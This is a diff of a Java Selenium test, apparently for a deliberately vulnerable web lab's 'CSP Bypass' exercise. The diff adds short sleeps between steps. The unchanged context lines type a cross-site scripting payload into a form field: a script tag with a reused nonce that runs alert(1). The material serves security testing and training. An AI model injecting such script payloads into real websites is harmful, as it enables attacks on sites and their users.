@@ -17,7 +17,9 @@ public class Test5CSPBypass extends BaseTest{
 	System.out.println(driver.getCurrentUrl());
 	
 	driver.findElement(By.linkText("CSP Bypass")).click();
+	Thread.sleep(1000);
 	driver.findElement(By.name("include")).sendKeys("<script nonce=\"TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=\">alert(1)</script>");
+	Thread.sleep(1000);
 	driver.findElement(By.xpath("//*[@id=\"main_body\"]/div/div/form/input[2]")).click();
 	Thread.sleep(500);
 	
